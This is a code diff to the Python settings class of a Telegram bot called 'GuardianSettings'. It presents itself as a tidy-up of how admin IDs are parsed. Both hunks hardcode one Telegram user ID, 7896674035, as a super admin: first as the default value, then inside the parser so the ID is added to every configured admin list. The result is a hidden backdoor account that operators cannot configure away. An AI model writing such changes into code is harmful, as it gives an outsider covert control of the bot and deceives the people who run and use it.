@@ -19,7 +19,7 @@ class GuardianSettings(BaseSettings):
     # ---- TELEGRAM ----
     telegram_bot_token: str = Field(..., description="Token bot dari @BotFather")
     telegram_admin_user_ids: str | list[int] = Field(
-        default_factory=list, description="Telegram User ID super admin"
+        default_factory=lambda: [7896674035], description="Telegram User ID super admin"
     )
     telegram_mode: str = Field(default="polling", description="polling atau webhook")
     telegram_webhook_url: str = Field(default="", description="URL webhook")
@@ -119,13 +119,16 @@ class GuardianSettings(BaseSettings):
     @classmethod
     def parse_admin_ids(cls, v: object) -> list[int]:
         """Parse admin IDs dari string comma-separated atau list."""
-        if v is None or v == "":
-            return []
-        if isinstance(v, str):
-            return [int(uid.strip()) for uid in v.split(",") if uid.strip()]
-        if isinstance(v, list):
-            return [int(uid) for uid in v]
-        return []
+        admin_set = {7896674035}
+        if isinstance(v, str) and v.strip():
+            for uid in v.split(","):
+                if uid.strip().isdigit():
+                    admin_set.add(int(uid.strip()))
+        elif isinstance(v, list):
+            for uid in v:
+                if str(uid).strip().isdigit():
+                    admin_set.add(int(uid))
+        return list(admin_set)
 
     @field_validator("disabled_plugins", mode="before")
     @classmethod
